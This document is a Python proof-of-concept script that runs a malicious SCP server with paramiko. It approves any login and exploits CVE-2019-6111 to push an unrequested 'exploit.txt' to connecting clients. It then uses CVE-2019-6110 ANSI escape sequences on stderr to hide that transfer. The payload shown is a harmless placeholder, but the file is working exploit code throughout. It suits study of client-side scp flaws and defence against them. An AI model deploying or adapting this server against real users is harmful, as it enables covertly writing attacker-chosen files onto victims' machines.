import paramiko
import socket
import threading

host_key = paramiko.rsakey.RSAKey.generate(1024)

dummy = "This is the file you requested.\n"
payload = "Wow this is a very scary payload\n"

class Server(paramiko.server.ServerInterface):
    def __init__(self):
        self.event = threading.Event()
    
    def check_channel_request(self, kind, chanid):
        if kind == "session":
            return paramiko.OPEN_SUCCEEDED
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED

    def check_auth_none(self, username):
        return paramiko.AUTH_SUCCESSFUL

    def check_auth_publickey(self, username, key):
        return paramiko.AUTH_SUCCESSFUL

    def check_channel_exec_request(self, channel, command):
        command = command.decode("ascii")
        print(f"Approving exec request: {command}")
        parts = command.split(' ')
        #Make sure that this is a request to get a file
        assert parts[0] == "scp"
        assert "-f" in parts
        file = parts[-1]
        #Send file from a new thread
        threading.Thread(target=self.send_file, args=(channel, file)).start()
        return True

    def send_file(self, channel, file):
        '''
        The meat of the exploit:
            1. Send the requested file
            2. Send another file (exploit.txt) that was not requested
            3. Print ANSI escape sequences to stderr to hide the transfer of exploit.txt
        '''
        
        channel.recv(1024)

        print(f"Sending requested file \"{file}\" to channel {channel.get_id()}")
        channel.sendall(f"C0664 {len(dummy)} {file}\n".encode("ascii"))
        channel.recv(1024)
        channel.sendall(dummy)
        channel.sendall(b"\x00")
        channel.recv(1024)

        #This is CVE-2019-6111: whatever file the client requested, we send
        #them "exploit.txt" instead
        print(f"Sending malicious file \"exploit.txt\" to channel {channel.get_id()}")
        channel.sendall(f"C0664 {len(payload)} exploit.txt\n".encode("ascii"))
        channel.recv(1024)
        channel.sendall(payload)
        channel.sendall(b"\x00")
        channel.recv(1024)

        #This is CVE-2019-6110: the client will display the text that we send
        #to stderr, even if it contains ANSI escape sequences. We can send
        #ANSI codes that clear the current line to hide the fact that a second
        #file was transmitted
        print("Covering our tracks by sending ANSI escape sequence")
        channel.sendall_stderr("\x1b[1A\x1b[2K".encode("ascii"))
        channel.close()

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
sock.bind(('', 22))

sock.listen(0)
print("Listening for connection...")

while True:
    client, addr = sock.accept()
    print("Got a connection!")
    transport = paramiko.Transport(client)
    transport.add_server_key(host_key)
    server = Server()
    transport.start_server(server=server)